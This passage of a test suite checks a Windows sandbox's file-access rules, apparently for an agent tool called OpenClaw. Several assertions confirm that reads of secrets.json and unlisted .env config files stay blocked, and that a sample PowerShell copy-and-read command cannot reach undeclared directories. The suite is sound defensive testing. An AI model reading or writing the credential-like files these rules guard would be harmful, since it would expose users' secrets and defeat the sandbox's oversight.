      }
    });

    it("allows reads and writes through already-authorized file descriptors", () => {
      const originalActive = sandboxState.state.sandboxActive;
      try {
        sandboxState.state.sandboxActive = true;
        expect(sandboxState.isReadBlockedPath(3, false)).toBe(false);
        expect(sandboxState.isBlockedPath(3)).toBe(false);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
      }
    });

    it("allows OpenClaw to probe its optional XDG config directory", () => {
      const originalActive = sandboxState.state.sandboxActive;
      try {
        sandboxState.state.sandboxActive = true;
        expect(
          sandboxState.isReadBlockedPath(
            path.join(process.env.USERPROFILE!, ".config", "openclaw", "gateway.env"),
            false,
          ),
        ).toBe(false);
        expect(
          sandboxState.isBlockedPath(
            path.join(process.env.USERPROFILE!, ".config", "openclaw", "gateway.env"),
          ),
        ).toBe(true);
        expect(
          sandboxState.isReadBlockedPath(
            path.join(process.env.USERPROFILE!, ".config", "openclaw", "gateway.env"),
            true,
          ),
        ).toBe(true);
        expect(
          sandboxState.isReadBlockedPath(
            path.join(process.env.USERPROFILE!, ".config", "openclaw", "other.env"),
            false,
          ),
        ).toBe(true);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
      }
    });

    it("allows only package manifests while OpenClaw walks workspace ancestors", () => {
      const originalActive = sandboxState.state.sandboxActive;
      const originalRW = sandboxState.state._rwDirs.slice();
      const originalRO = sandboxState.state._roDirs.slice();
      try {
        sandboxState.state.sandboxActive = true;
        sandboxState.state._rwDirs = [];
        sandboxState.state._roDirs = [];
        const home = process.env.USERPROFILE!;
        expect(sandboxState.isReadBlockedPath(path.join(home, "package.json"), false)).toBe(false);
        expect(
          sandboxState.isReadBlockedPath(path.join(path.dirname(home), "package.json"), false),
        ).toBe(false);
        expect(
          sandboxState.isReadBlockedPath(path.join(path.parse(home).root, "package.json"), false),
        ).toBe(false);
        expect(sandboxState.isBlockedPath(path.join(home, "package.json"))).toBe(true);
        expect(sandboxState.isBlockedPath(path.join(path.dirname(home), "package.json"))).toBe(
          true,
        );
        expect(sandboxState.isBlockedPath(path.join(path.parse(home).root, "package.json"))).toBe(
          true,
        );
        expect(sandboxState.isReadBlockedPath(path.join(home, "package.json"), true)).toBe(true);
        expect(sandboxState.isReadBlockedPath(path.join(home, "secrets.json"), false)).toBe(true);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
        sandboxState.state._rwDirs = originalRW;
        sandboxState.state._roDirs = originalRO;
      }
    });
  });

  describe("end-to-end: declare A + command touches A,B,C", () => {
    // Simulates the full scenario without IPC:
    // 1. declare-access grants RW to DirA → sets RW dir
    // 2. Command: Copy-Item DirA\f.txt DirB\; Get-Content DirC\data.txt
    // 3. Verify: DirB and DirC are still blocked

    it("declare rw:DirA, command writes DirB and reads DirC — B and C remain blocked", () => {
      const originalActive = sandboxState.state.sandboxActive;
      const originalRW = sandboxState.state._rwDirs.slice();
      const originalRO = sandboxState.state._roDirs.slice();

      try {
        sandboxState.state.sandboxActive = true;
        // Simulate: declare-access granted RW to DirA
        sandboxState.state._rwDirs = sandboxState.normDirList("C:\\DirA");
        sandboxState.state._roDirs = [];

        // The command payload (after tag stripping)
        const payload =
          'Copy-Item "C:\\DirA\\f.txt" "C:\\DirB\\"; Get-Content "C:\\DirC\\data.txt"';

        // Path extraction finds all paths
        const writePaths = pathExtraction.extractWritePaths(payload);
        const readPaths = pathExtraction.extractReadPaths(payload);

        // DirA (source) is in read paths — not blocked
        const dirARead = readPaths.find((p: string) => p.toLowerCase().includes("dira"));
        if (dirARead) {
          expect(sandboxState.isReadBlockedPath(dirARead, true)).toBe(false);
        }

        // DirB (write target) — IS blocked (not in RW dirs)
        const dirBWrite = writePaths.find((p: string) => p.toLowerCase().includes("dirb"));
        expect(dirBWrite).toBeDefined();
        expect(sandboxState.isBlockedPath(dirBWrite!)).toBe(true);

        // DirC (read target) — IS blocked (not in RO or RW dirs)
        const dirCRead = readPaths.find((p: string) => p.toLowerCase().includes("dirc"));
        expect(dirCRead).toBeDefined();
        expect(sandboxState.isReadBlockedPath(dirCRead!, true)).toBe(true);
      } finally {
        sandboxState.state.sandboxActive = originalActive;
        sandboxState.state._rwDirs = originalRW;
        sandboxState.state._roDirs = originalRO;
      }
    });
  });
});
